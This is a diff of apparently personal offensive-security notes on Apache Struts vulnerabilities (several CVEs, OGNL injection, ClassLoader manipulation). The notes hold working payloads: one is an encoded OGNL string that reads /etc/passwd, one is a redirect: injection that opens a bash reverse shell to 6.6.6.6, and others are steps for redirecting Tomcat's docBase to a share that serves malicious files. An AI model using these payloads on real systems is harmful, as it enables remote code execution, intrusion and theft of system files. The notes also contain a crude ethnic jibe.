@@ -1,22 +1,14 @@
 # struts
 
-# tutoriels developpez.com
-http://java.developpez.com/cours/?page=developpement-web-cat#struts
-
-# le premier est pas mal (simple et concis) 
+# good overview
+http://synacktiv.com/ressources/20121025-jssi_rouen-j2ee_frameworks.pdf
 http://rpouiller.developpez.com/tutoriel/java/struts-eclipse-tomcat/
-
-## VULNS
-http://struts.apache.org/downloads.html
 
 # worm attack
 https://www.mandiant.com/blog/responding-attacks-apache-struts2/
 $%7b%23a=(new%20java.lang.ProcessBuilder(new%20java.lang.String%5b%5d%7b'cat','/etc/passwd'%7d)).start(),%23b=%23a.getInputStream(),%23c=new%20java.io.InputStreamReader(%23b),%23d=new%20java.io.BufferedReader(%23c),%23e=new=%20char%5b50000%5d,%23d.read(%23e),%23o=%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23o.getWriter().println(%23e),%23o.getWriter().flush(),%23o.getWriter().close()%7d
 
 execute arbitrary OGNL code with ${} or %{}
-
-# good overview
-http://synacktiv.com/ressources/20121025-jssi_rouen-j2ee_frameworks.pdf
 
 # CVE-2010-1870
 http://blog.o0o.nu/2010/07/cve-2010-1870-struts2xwork-remote.html (good intro on OGNL)
@@ -61,21 +53,10 @@ defined in WEB-INF/classes/struts.xml, each action can be called by appending ".
 /blah.action?redirect:${(new+java.lang.ProcessBuilder(new+java.lang.String[]{'/bin/bash','-c','/bin/bash%200</dev/tcp/6.6.6.6/80%201>%260%202>%260'})).start() // reverse shell
 
 http://seclists.org/bugtraq/2013/Aug/101
-  Immediate upgrade to the latest version is strongly recommended as
-  active attacks have already been observed. It should be noted that
-  redirect: and redirectAction: parameters were completely dropped and
-  do not work in the latest version as stated in the vender's page.
-  Thus attention for compatibility issues is required for upgrade.
-
-  If you cannot upgrade your Struts2 immediately, filtering (by custom
-  servlet filter, IPS, WAF and so on) can be a mitigation solution for
-  this vulnerability. Some points about filtering solution are listed
-  below.
 
   - Both %{expr} and ${expr} notation can be used for attacks.
   - Parameters both in querystring and in request body can be used.
-  - redirect: and redirectAction: can be used not only for Java method
-    execution but also for open redirect.
+  - redirect: and redirectAction: can be used not only for Java method execution but also for open redirect.
 
 # CVE-2014-0114 from ClassLoader manipulation to RCE (on Tomcat 8 only?)
 https://struts.apache.org/docs/s2-020.html
@@ -105,7 +86,7 @@ also might work: ?class['classLoader']['resources']['dirContext']['docBase']=/ o
 /shell1.jsp -> results of ls
 
 * tomcat7 - sucessfully tested against struts 1.2.7 on tomcat-7.0.55 you make the classloader point to a share instead of local filesystem
--- unsafe method (aka the chinese apt fuck'all way)
+-- unsafe method (aka the chinese apt fuck it way)
 /!\ warning if you change docBase it will break everything:
 http://127.0.0.1:8080/struts-mailreader/EditRegistration.do?class.classLoader.resources.dirContext.docBase=//192.168.122.1/share
 then look at wireshark to see what files it tries to load and replace them with malicious ones
@@ -137,18 +118,11 @@ welcome.do?class.classLoader.jarPath=(#context["xwork.MethodAccessor.denyMethodE
 http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Protect-your-Struts1-applications/ba-p/6463188 [1]
 http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Update-your-Struts-1-ClassLoader-manipulation-filters/ba-p/6639204 [2]
 
-* good read
-http://sec.baidu.com/index.php?research/detail/id/18
-http://drops.wooyun.org/papers/1377
-
 # CVE-2016-3081
 https://struts.apache.org/docs/s2-032.html
-http://drops.wooyun.org/papers/15430
-
-# not about S2-020
-http://zone.wooyun.org/content/3880
-http://blog.wangzhan.360.cn/?p=222
-http://www.hljy.com.cn/elmah.axd/detail?id=a6bddf7c-868f-4c15-afaa-662621bf0ad4
 
 # CVE-2017-5638
 https://svn.nmap.org/nmap/scripts/http-vuln-cve2017-5638.nse
+
+# CVE-2017-9805
+https://struts.apache.org/docs/s2-052.html
